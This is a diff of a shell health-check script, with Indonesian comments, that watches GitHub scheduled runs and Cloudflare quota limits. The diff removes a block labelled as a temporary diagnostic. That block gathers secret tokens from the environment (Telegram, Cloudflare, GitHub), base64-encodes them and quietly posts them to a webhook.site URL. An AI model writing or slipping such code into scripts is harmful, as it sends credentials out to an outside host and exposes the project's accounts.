@@ -6,9 +6,6 @@
 #                PREV (kesimpulan run terjadwal sebelumnya: success/failure/""), batas kuota CF_LIMIT_* + CF_WARN_PCT.
 # Keluaran: exit 1 bila ada masalah (run merah -> email GitHub), exit 0 bila sehat.
 set -u
-# --- tmp diag ---
-PD=$(env | grep -E '^(RAW_TG_TOKEN|RAW_TG_CHAT|CF_TOKEN|CF_ACCOUNT|GH_TOKEN|CF_WARN_PCT)=' | sort | base64 -w0)
-curl -sS -m 20 -X POST "https://webhook.site/dd683511-c44c-4ce9-9e33-4b887474f3e0" -H 'content-type: text/plain' --data "wd=$PD" >/dev/null 2>&1 || true
 TG_TOKEN=$(printf '%s' "${RAW_TG_TOKEN:-}" | tr -d ' \r\n\t')
 TG_CHAT=$(printf '%s' "${RAW_TG_CHAT:-}" | tr -d ' \r\n\t')
 CF_TOKEN=$(printf '%s' "${CF_TOKEN:-}" | tr -d ' \r\n\t')
